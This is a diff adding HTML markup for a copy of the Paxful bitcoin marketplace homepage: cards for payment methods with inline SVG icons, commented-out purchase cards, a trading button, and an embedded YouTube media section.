+                        <path fill="var(--icons-bg-fill, #ffffff)" d="M1 9a2 2 0 012-2h32a2 2 0 012 2v16a2 2 0 01-2 2H3a2 2 0 01-2-2V9z"></path>
+                        <path fill="#00A5EF" d="M4 12a2 2 0 012-2h31v17H4V12z" opacity="0.2"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M0 9a3 3 0 013-3h32a3 3 0 013 3v16a3 3 0 01-3 3H3a3 3 0 01-3-3V9zm3-1a1 1 0 00-1 1v16a1 1 0 001 1h32a1 1 0 001-1V9a1 1 0 00-1-1H3z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-bg-fill, #ffffff)" d="M23 17a4 4 0 11-8 0 4 4 0 018 0z"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M19 14a3 3 0 100 6 3 3 0 000-6zm-5 3a5 5 0 1110 0 5 5 0 01-10 0z" clip-rule="evenodd"></path>
+                      </svg><strong class="d-block h4 ml-3 ml-md-0 mb-0 mb-sm-1">Cash payment</strong>
+                    </div>
+                    <p class="mt-1 mb-0 regular-18 d-none d-sm-block">Happy to accept cash? Then you can do just that.</p>
+                  </a>
+                </div>
+                <div class="col-md-6 col-lg-4 col-sm-12 mb-2 mb-sm-4">
+                  <a href="https://paxful.com/sell-bitcoin?group=online-transfers&amp;hasScroll=true" data-page="Home" class="h-100 actionsBoard__card card p-3 p-md-4 flex-grow d-flex text-dark text-left">
+                    <div class="d-flex flex-row flex-md-column align-items-center align-items-md-start">
+                      <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor">
+                        <path fill="var(--icons-secondary, #454c59)" d="M7 9a2 2 0 012-2h30a2 2 0 012 2v17a2 2 0 01-2 2H9a2 2 0 01-2-2V9z" opacity="0.15"></path>
+                        <path fill="var(--icons-bg-fill, #ffffff)" d="M6 5a2 2 0 012-2h32a2 2 0 012 2v16a2 2 0 01-2 2H8a2 2 0 01-2-2V5z"></path>
+                        <path fill="#00A5EF" d="M9 9a2 2 0 012-2h26a2 2 0 012 2v14H9V9z" opacity="0.2"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M5 5a3 3 0 013-3h32a3 3 0 013 3v16a3 3 0 01-3 3H8a3 3 0 01-3-3V5zm3-1a1 1 0 00-1 1v16a1 1 0 001 1h32a1 1 0 001-1V5a1 1 0 00-1-1H8z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-bg-fill, #ffffff)" d="M29 13a5 5 0 11-10 0 5 5 0 0110 0z"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M24 16a3 3 0 100-6 3 3 0 000 6zm0 2a5 5 0 100-10 5 5 0 000 10z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-secondary, #454c59)" d="M29 35a1 1 0 112 0v10a1 1 0 11-2 0V35zm-6-4a1 1 0 112 0v7a1 1 0 11-2 0v-7zm-12 0a1 1 0 112 0v4a1 1 0 11-2 0v-4zm24 0a1 1 0 112 0v6a1 1 0 11-2 0v-6zm-18 2a1 1 0 112 0v9a1 1 0 11-2 0v-9z"></path>
+                      </svg><strong class="d-block h4 ml-3 ml-md-0 mb-0 mb-sm-1">Online wallets</strong>
+                    </div>
+                    <p class="mt-1 mb-0 regular-18 d-none d-sm-block">Receive payment through popular online wallets including MTN Mobile Money, M-Pesa, and Momo.</p>
+                  </a>
+                </div>
+                <div class="col-md-6 col-lg-4 col-sm-12 mb-2 mb-sm-4">
+                  <a href="https://paxful.com/sell-bitcoin?group=gift-cards&amp;hasScroll=true" data-page="Home" class="h-100 actionsBoard__card card p-3 p-md-4 flex-grow d-flex text-dark text-left">
+                    <div class="d-flex flex-row flex-md-column align-items-center align-items-md-start">
+                      <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor">
+                        <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M10 9a3 3 0 013-3h32a3 3 0 013 3v18a3 3 0 01-3 3H13a3 3 0 01-3-3V9zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h32a1 1 0 001-1V9a1 1 0 00-1-1H13z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M26 14a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0zm11 5a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-secondary, #454c59)" d="M32.778 13.707a1 1 0 011.414 1.414l-7.07 7.071a1 1 0 01-1.415-1.414l7.071-7.07z"></path>
+                        <path fill="var(--icons-secondary, #454c59)" d="M11 14h28a2 2 0 012 2v16a2 2 0 01-2 2H13a2 2 0 01-2-2V14z" opacity="0.15"></path>
+                        <path fill="var(--icons-bg-fill, #ffffff)" d="M1 21a2 2 0 012-2h32a2 2 0 012 2v18a2 2 0 01-2 2H3a2 2 0 01-2-2V21z"></path>
+                        <path fill="#00A5EF" d="M4 36a2 2 0 002 2h31V19H4v17z" opacity="0.2"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M0 21a3 3 0 013-3h32a3 3 0 013 3v18a3 3 0 01-3 3H3a3 3 0 01-3-3V21zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h32a1 1 0 001-1V21a1 1 0 00-1-1H3z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M16 26a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0zm11 5a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0z" clip-rule="evenodd"></path
+                        <path fill="var(--icons-primary, #0097db)" d="M22.778 25.707a1 1 0 011.414 1.414l-7.07 7.071a1 1 0 01-1.415-1.414l7.071-7.07z"></path>
+                      </svg><strong class="d-block h4 ml-3 ml-md-0 mb-0 mb-sm-1">Discounted gift cards</strong>
+                    </div>
+                    <p class="mt-1 mb-0 regular-18 d-none d-sm-block">Use your Bitcoin to get big discounts on popular gift cards.</p>
+                  </a>
+                </div>
+                <div class="col-md-6 col-lg-4 col-sm-12 mb-2 mb-sm-4"><a href="https://paxful.com/sell-bitcoin?group=digital-currencies&amp;hasScroll=true" data-page="Home" class="h-100 actionsBoard__card card p-3 p-md-4 flex-grow d-flex text-dark text-left">
+                  <div class="d-flex flex-row flex-md-column align-items-center align-items-md-start">
+                    <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor">
+                      <path fill="var(--icons-secondary, #454c59)" d="M16 19a2 2 0 012-2h18a2 2 0 012 2v17a2 2 0 01-2 2H18a2 2 0 01-2-2V19z" opacity="0.15"></path>
+                      <path fill="var(--icons-bg-fill, #ffffff)" d="M13 15a2 2 0 012-2h18a2 2 0 012 2v18a2 2 0 01-2 2H15a2 2 0 01-2-2V15z"></path>
+                      <path fill="#00A5EF" d="M16 18a2 2 0 012-2h17v17a2 2 0 01-2 2H16V18z" opacity="0.2"></path>
+                      <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M18 21a3 3 0 013-3h6a1 1 0 110 2h-6a1 1 0 00-1 1v3a1 1 0 11-2 0v-3z" clip-rule="evenodd"></path>
+                      <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M12 15a3 3 0 013-3h18a3 3 0 013 3v18a3 3 0 01-3 3H15a3 3 0 01-3-3V15zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h18a1 1 0 001-1V15a1 1 0 00-1-1H15z" clip-rule="evenodd"></path>
+                      <path fill="var(--icons-primary, #0097db)" d="M20 29a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z"></path>
+                      <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M20 2a1 1 0 011 1v2h2V4a1 1 0 112 0v1h2V3a1 1 0 112 0v2h2V4a1 1 0 112 0v1h2V3a1 1 0 112 0v2h3a3 3 0 013 3v3h2a1 1 0 110 2h-2v2h1a1 1 0 110 2h-1v2h2a1 1 0 110 2h-2v2h1a1 1 0 110 2h-1v2h2a1 1 0 110 2h-2v2h1a1 1 0 110 2h-1v2h2a1 1 0 110 2h-2v3a3 3 0 01-3 3h-3v2a1 1 0 11-2 0v-2h-2v1a1 1 0 11-2 0v-1h-2v2a1 1 0 11-2 0v-2h-2v1a1 1 0 11-2 0v-1h-2v2a1 1 0 11-2 0v-2h-2v1a1 1 0 11-2 0v-1h-2v2a1 1 0 11-2 0v-2H8a3 3 0 01-3-3v-3H3a1 1 0 110-2h2v-2H4a1 1 0 110-2h1v-2H3a1 1 0 110-2h2v-2H4a1 1 0 110-2h1v-2H3a1 1 0 110-2h2v-2H4a1 1 0 110-2h1v-2H3a1 1 0 110-2h2V8a3 3 0 013-3h3V3a1 1 0 112 0v2h2V4a1 1 0 112 0v1h2V3a1 1 0 011-1zM8 7a1 1 0 00-1 1v32a1 1 0 001 1h32a1 1 0 001-1V8a1 1 0 00-1-1H8z" clip-rule="evenodd"></path>
+                      <path fill="var(--icons-primary, #0097db)" d="M29 22a1 1 0 011 1v2a1 1 0 11-2 0v-2a1 1 0 011-1z"></path>
+                    </svg><strong class="d-block h4 ml-3 ml-md-0 mb-0 mb-sm-1">Digital currencies</strong>
+                  </div>
+                  <p class="mt-1 mb-0 regular-18 d-none d-sm-block">Use Tether, Ethereum, Litecoin, and more to sell Bitcoin.</p>
+                </a>
+              </div>
+              <div class="col-md-6 col-lg-4 col-sm-12 mb-2 mb-sm-4">
+                <a href="https://paxful.com/sell-bitcoin?group=goods-and-services&amp;hasScroll=true" data-page="Home" class="h-100 actionsBoard__card card p-3 p-md-4 flex-grow d-flex text-dark text-left">
+                  <div class="d-flex flex-row flex-md-column align-items-center align-items-md-start">
+                    <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor">
+                      <path fill="var(--icons-bg-fill, #ffffff)" d="M10 5l1-2h25.5L38 4v3l6.5 13-.5 1H4.5l-1-1L10 7V5z"></path>
+                      <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M6 20h36v24h4v2H2v-2h4V20zm2 2h32v22H22V28H12v16H8V22zm12 8v14h-6V30h6zm11-2a5 5 0 00-5 5v3h10v-3a5 5 0 00-5-5zm3 6v-1a3 3 0 10-6 0v1h6z" clip-rule="evenodd"></path>
+                      <path fill="#00A5EF" d="M12 10h28l3.936 9.621A1 1 0 0143.01 21H7.685a1 1 0 01-.878-1.479L12 10z" opacity="0.2"></path>
+                      <path fill="var(--icons-secondary, #454c59)" d="M6 22h36v2H6v-2z" opacity="0.15"></path>
+                      <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M9 5a3 3 0 013-3h24a3 3 0 013 3v1.764l6.17 12.342A2 2 0 0143.383 22H4.618a2 2 0 01-1.789-2.894L9 6.764V5zm1.618 3h26.764l6 12H4.618l1-2H24v-2H6.618l4-8zM37 5v1H11V5a1 1 0 011-1h24a1 1 0 011 1z" clip-rule="evenodd"></path>
+                    </svg><strong class="d-block h4 ml-3 ml-md-0 mb-0 mb-sm-1">Goods and services</strong>
+                  </div>
+                  <p class="mt-1 mb-0 regular-18 d-none d-sm-block">Use Bitcoin to pay for goods and services from around the world.</p>
+                </a>
+              </div>
+            </div>
+
+            <!-- <div class="container">
+
+                <div class="row">
+                    <div class="pricing-column col-lg-4 col-md-6">
+                      <div class="card">
+                      
+                        <div class="card-body">
+                          
+                          <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-bg-fill, #ffffff)" d="M9 19h6v19H9V19zm12 0h6v19h-6V19zm12 0h6v19h-6V19z"></path><path fill="#00A5EF" fill-opacity="0.2" d="M9 19h6v19H9V19z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M8 18h8v21H8V18zm2 2v17h4V20h-4z" clip-rule="evenodd"></path><path fill="#00A5EF" fill-opacity="0.2" d="M33 19h6v19h-6V19z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 18h8v21h-8V18zm2 2v17h4V20h-4z" clip-rule="evenodd"></path><path fill="#00A5EF" fill-opacity="0.2" d="M21 19h6v19h-6V19z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M20 18h8v21h-8V18zm2 2v17h4V20h-4z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M8 37a3 3 0 00-3 3v1a3 3 0 00-3 3v2h2v-2a1 1 0 011-1h38a1 1 0 011 1v2h2v-2a3 3 0 00-3-3v-1a3 3 0 00-3-3H8zm33 4v-1a1 1 0 00-1-1H8a1 1 0 00-1 1v1h34z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M8 19h8v3H8zm12 0h8v3h-8zm12 0h8v3h-8z" opacity="0.15"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M22.235 3.047a3 3 0 013.53 0L44.1 16.383c1.567 1.139.76 3.617-1.176 3.617H5.075c-1.937 0-2.743-2.478-1.176-3.617L22.235 3.047zm2.353 1.617a1 1 0 00-1.176 0L5.075 18h37.85L24.588 4.664z" clip-rule="evenodd"></path></svg>
+                          <h4>Bank Transfer</h4>
+                          <p>Our guided bank transfer trades quick and easy to buy Bitcoin</p>
+                        </div>
+                      </div>
+                    </div>
+
+              
+                  <div class="pricing-column col-lg-4 col-md-6">
+                    <div class="card">
+                    
+                      <div class="card-body">
+                        <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M8 16a3 3 0 00-3 3v24a3 3 0 003 3h30a3 3 0 003-3v-7h-2v7a1 1 0 01-1 1H8a1 1 0 01-1-1V22h31a1 1 0 011 1v7h2v-7a3 3 0 00-3-3h-1v-1a3 3 0 00-3-3H8zm27 4v-1a1 1 0 00-1-1H8a1 1 0 00-1 1v1h28z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M32 32a3 3 0 013-3h6a3 3 0 013 3v2a3 3 0 01-3 3h-6a3 3 0 01-3-3v-2zm3-1a1 1 0 00-1 1v2a1 1 0 001 1h6a1 1 0 001-1v-2a1 1 0 00-1-1h-6z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M7 39a1 1 0 110-2h11a1 1 0 110 2H7z"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M15 32a1 1 0 010 1.414l-1.207 1.207a3 3 0 01-2.121.879H7v-2h4.672a1 1 0 00.707-.293L13.586 32A1 1 0 0115 32zm5 5a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M18 8H9a2 2 0 00-2 2v12h11V8z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M34 20V5a2 2 0 00-2-2H14a2 2 0 00-2 2v15h22z" clip-rule="evenodd"></path><path fill="#00A5EF" fill-rule="evenodd" d="M31 20V8a2 2 0 00-2-2H12v14h19z" clip-rule="evenodd" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M35 5a3 3 0 00-3-3H14a3 3 0 00-3 3v15h2V5a1 1 0 011-1h18a1 1 0 011 1v15h2V5z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" d="M26 16a1 1 0 01-1-1V9a1 1 0 112 0v6a1 1 0 01-1 1zm-4 2a1 1 0 01-1-1v-6a1 1 0 112 0v6a1 1 0 01-1 1z"></path></svg>
+                        <h4>Cash Transfer</h4>
+                        <p>Buy Bitcoin using a huge range of popular online wallets,including Paypal,M-Pesa,and Apple pay</p>
+                      </div>
+                    </div>
+                  </div>
+                
+                    <div class="pricing-column col-lg-4 col-md-6">
+                      <div class="card">
+                      
+                        <div class="card-body">
+                          <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M10 21a3 3 0 013-3h32a3 3 0 013 3v18a3 3 0 01-3 3H13a3 3 0 01-3-3V21zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h32a1 1 0 001-1V21a1 1 0 00-1-1H13z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M20 29.465a4 4 0 110-6.93 4 4 0 110 6.93z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M20 27.154l1.002.58a2 2 0 100-3.467L20 24.845l-1.002-.58a2 2 0 100 3.467L20 27.155zm0-4.619a4 4 0 100 6.93 4 4 0 100-6.93z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M14 33a1 1 0 011-1h20a1 1 0 110 2H15a1 1 0 01-1-1zm0 4a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1zm10 0a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z"></path><path fill="var(--icons-secondary, #454c59)" d="M10 16a2 2 0 012-2h28a2 2 0 012 2v16a2 2 0 01-2 2H10V16z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M1 9a2 2 0 012-2h32a2 2 0 012 2v18a2 2 0 01-2 2H3a2 2 0 01-2-2V9z"></path><path fill="#00A5EF" d="M4 12a2 2 0 012-2h31v19H4V12z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M0 9a3 3 0 013-3h32a3 3 0 013 3v18a3 3 0 01-3 3H3a3 3 0 01-3-3V9zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h32a1 1 0 001-1V9a1 1 0 00-1-1H3z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" fill-rule="evenodd" d="M10 17.465a4 4 0 110-6.93 4 4 0 110 6.93z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M10 15.154l1.002.58a2 2 0 100-3.467L10 12.845l-1.001-.58a2 2 0 100 3.467L10 15.155zm0-4.619a4 4 0 100 6.93 4 4 0 100-6.93z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" d="M4 21a1 1 0 011-1h20a1 1 0 110 2H5a1 1 0 01-1-1zm0 4a1 1 0 011-1h6a1 1 0 110 2H5a1 1 0 01-1-1zm10 0a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z"></path></svg>
+                          <h4>Online wallets</h4>
+                          Online wallets
+                          <p>Use your debit or credit card to buy Bitcoin from user's around the world</p>
+                        </div>
+                      </div>
+                    </div>
+          
+                </div>
+            </div> -->
+            <!-- <div class="container">
+
+              <div class="row">
+                <div class="pricing-column col-lg-4 col-md-6">
+                  <div class="card">
+                  
+                    <div class="card-body">
+                      <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M10 9a3 3 0 013-3h32a3 3 0 013 3v18a3 3 0 01-3 3H13a3 3 0 01-3-3V9zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h32a1 1 0 001-1V9a1 1 0 00-1-1H13z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M26 14a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0zm11 5a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M32.778 13.707a1 1 0 011.414 1.414l-7.07 7.071a1 1 0 01-1.415-1.414l7.071-7.07z"></path><path fill="var(--icons-secondary, #454c59)" d="M11 14h28a2 2 0 012 2v16a2 2 0 01-2 2H13a2 2 0 01-2-2V14z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M1 21a2 2 0 012-2h32a2 2 0 012 2v18a2 2 0 01-2 2H3a2 2 0 01-2-2V21z"></path><path fill="#00A5EF" d="M4 36a2 2 0 002 2h31V19H4v17z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M0 21a3 3 0 013-3h32a3 3 0 013 3v18a3 3 0 01-3 3H3a3 3 0 01-3-3V21zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h32a1 1 0 001-1V21a1 1 0 00-1-1H3z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M16 26a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0zm11 5a1 1 0 100 2 1 1 0 000-2zm-3 1a3 3 0 116 0 3 3 0 01-6 0z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" d="M22.778 25.707a1 1 0 011.414 1.414l-7.07 7.071a1 1 0 01-1.415-1.414l7.071-7.07z"></path></svg>
+                      <h4>Discounted Gift cards</h4>
+                      <p>have a gift card you don't need? It doesn't have togo to waste --now you can trade it for Bitcoin</p>
+                    </div>
+                  </div>
+                </div>
+
+            
+              <div class="pricing-column col-lg-4 col-md-6">
+                <div class="card">
+                
+                  <div class="card-body">
+                    <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" d="M16 19a2 2 0 012-2h18a2 2 0 012 2v17a2 2 0 01-2 2H18a2 2 0 01-2-2V19z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M13 15a2 2 0 012-2h18a2 2 0 012 2v18a2 2 0 01-2 2H15a2 2 0 01-2-2V15z"></path><path fill="#00A5EF" d="M16 18a2 2 0 012-2h17v17a2 2 0 01-2 2H16V18z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M18 21a3 3 0 013-3h6a1 1 0 110 2h-6a1 1 0 00-1 1v3a1 1 0 11-2 0v-3z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M12 15a3 3 0 013-3h18a3 3 0 013 3v18a3 3 0 01-3 3H15a3 3 0 01-3-3V15zm3-1a1 1 0 00-1 1v18a1 1 0 001 1h18a1 1 0 001-1V15a1 1 0 00-1-1H15z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" d="M20 29a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M20 2a1 1 0 011 1v2h2V4a1 1 0 112 0v1h2V3a1 1 0 112 0v2h2V4a1 1 0 112 0v1h2V3a1 1 0 112 0v2h3a3 3 0 013 3v3h2a1 1 0 110 2h-2v2h1a1 1 0 110 2h-1v2h2a1 1 0 110 2h-2v2h1a1 1 0 110 2h-1v2h2a1 1 0 110 2h-2v2h1a1 1 0 110 2h-1v2h2a1 1 0 110 2h-2v3a3 3 0 01-3 3h-3v2a1 1 0 11-2 0v-2h-2v1a1 1 0 11-2 0v-1h-2v2a1 1 0 11-2 0v-2h-2v1a1 1 0 11-2 0v-1h-2v2a1 1 0 11-2 0v-2h-2v1a1 1 0 11-2 0v-1h-2v2a1 1 0 11-2 0v-2H8a3 3 0 01-3-3v-3H3a1 1 0 110-2h2v-2H4a1 1 0 110-2h1v-2H3a1 1 0 110-2h2v-2H4a1 1 0 110-2h1v-2H3a1 1 0 110-2h2v-2H4a1 1 0 110-2h1v-2H3a1 1 0 110-2h2V8a3 3 0 013-3h3V3a1 1 0 112 0v2h2V4a1 1 0 112 0v1h2V3a1 1 0 011-1zM8 7a1 1 0 00-1 1v32a1 1 0 001 1h32a1 1 0 001-1V8a1 1 0 00-1-1H8z" clip-rule="evenodd"></path><path fill="var(--icons-primary, #0097db)" d="M29 22a1 1 0 011 1v2a1 1 0 11-2 0v-2a1 1 0 011-1z"></path></svg>
+                    <h4>Digital Currencies</h4>
+                    <p>Use Tether,Ethereum,litecoin,and more to buy Bitcoin</p>
+                  </div>
+                </div>
+              </div>
+              
+                <div class="pricing-column col-lg-4 col-md-6">
+                  <div class="card">
+                  
+                    <div class="card-body">
+                      <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M10 23a3 3 0 013-3h32a3 3 0 013 3v16a3 3 0 01-3 3H13a3 3 0 01-3-3V23zm3-1a1 1 0 00-1 1v16a1 1 0 001 1h32a1 1 0 001-1V23a1 1 0 00-1-1H13z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M29 34a3 3 0 100-6 3 3 0 000 6zm0 2a5 5 0 100-10 5 5 0 000 10z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M10 18a2 2 0 012-2h28a2 2 0 012 2v13a2 2 0 01-2 2H10V18z" opacity="0.15"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M1 9a2 2 0 012-2h32a2 2 0 012 2v16a2 2 0 01-2 2H3a2 2 0 01-2-2V9z"></path><path fill="#00A5EF" d="M4 12a2 2 0 012-2h31v17H4V12z" opacity="0.2"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M0 9a3 3 0 013-3h32a3 3 0 013 3v16a3 3 0 01-3 3H3a3 3 0 01-3-3V9zm3-1a1 1 0 00-1 1v16a1 1 0 001 1h32a1 1 0 001-1V9a1 1 0 00-1-1H3z" clip-rule="evenodd"></path><path fill="var(--icons-bg-fill, #ffffff)" d="M23 17a4 4 0 11-8 0 4 4 0 018 0z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M19 14a3 3 0 100 6 3 3 0 000-6zm-5 3a5 5 0 1110 0 5 5 0 01-10 0z" clip-rule="evenodd"></path></svg>
+                      <h4>Cash payment</h4>
+                      <p>cash is accepted here too -- no bank account needed</p>
+                    </div>
+                  </div>
+                </div>
+      
+            </div>
+            
+              <div class="pricing-column col-lg-4 col-md-6">
+                <div class="card">
+                
+                  <div class="card-body">
+                    <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor"><path fill="var(--icons-bg-fill, #ffffff)" d="M10 5l1-2h25.5L38 4v3l6.5 13-.5 1H4.5l-1-1L10 7V5z"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M6 20h36v24h4v2H2v-2h4V20zm2 2h32v22H22V28H12v16H8V22zm12 8v14h-6V30h6zm11-2a5 5 0 00-5 5v3h10v-3a5 5 0 00-5-5zm3 6v-1a3 3 0 10-6 0v1h6z" clip-rule="evenodd"></path><path fill="#00A5EF" d="M12 10h28l3.936 9.621A1 1 0 0143.01 21H7.685a1 1 0 01-.878-1.479L12 10z" opacity="0.2"></path><path fill="var(--icons-secondary, #454c59)" d="M6 22h36v2H6v-2z" opacity="0.15"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M9 5a3 3 0 013-3h24a3 3 0 013 3v1.764l6.17 12.342A2 2 0 0143.383 22H4.618a2 2 0 01-1.789-2.894L9 6.764V5zm1.618 3h26.764l6 12H4.618l1-2H24v-2H6.618l4-8zM37 5v1H11V5a1 1 0 011-1h24a1 1 0 011 1z" clip-rule="evenodd"></path></svg>
+                    <h4>Goods And services</h4>
+                    Online wallets
+                    <p>We've seen bitcoin bought with cars,gold,and much more</p>
+                  </div>
+                </div>
+              </div>
+
+          </div> -->
+        </div>
+          <div class="tardebtn">
+
+          <a href="https://paxful.com/buy-bitcoin?hasScroll=true" class="btn btn-primary btn-lg mt-3 mt-md-2 d-block d-md-inline-block ">Start Trading</a>
+        </div>
+      </div>
+      <div class="container2">
+        <article class="_2ooIC mb-5"><h2 class="h1 mb-2 col-md-6 text-center mx-auto">Paxful in the media.</h2><p class="small-text mb-4 col-md-8 text-center mx-auto">Paxful is a global peer-to-peer platform building a financial system for the 100% — one <a href="https://builtwithbitcoin.org/" target="_blank" rel="noreferrer">#Bitcoin</a> at a time. Check out our coverage in renowned publications and learn about our Built With Bitcoin initiative.</p><div class="video-placeholder-wrapper mx-auto"><div class="iframeLoader"><iframe id="popup-youtube-player" src="https://www.youtube.com/embed/KUqtlA0Joh0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" srcdoc="
+          <style>
+              *{padding:0;margin:0;overflow:hidden}
+              html,body{height:100%}
+              div{background: url(https://img.youtube.com/vi/KUqtlA0Joh0/hqdefault.jpg) no-repeat center center;background-size:cover;height:100%}
+              a:hover span {background-color: #0097DB}
+              span{position:absolute;width:48px;height:48px;border-radius:50%;background:#00A5EF url(&quot;/assets/icons/16/play.svg&quot;) no-repeat 17px 50%;top:calc(50% - 24px);left:calc(50% - 24px);}
+          </style>
+          <a href='https://www.youtube.com/embed/KUqtlA0Joh0?autoplay=1&amp;mute=1&amp;enablejsapi=1'><div></div><span></span></a>
+      "></iframe></div></div></article>
+
+          
+          <!-- <div class="video-placeholder-wrapper mx-auto"><div class="iframeLoader"><iframe id="popup-youtube-player" src="https://www.youtube.com/embed/KUqtlA0Joh0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" srcdoc="
+            <style>
+                *{padding:0;margin:0;overflow:hidden}
+                html,body{height:100%}
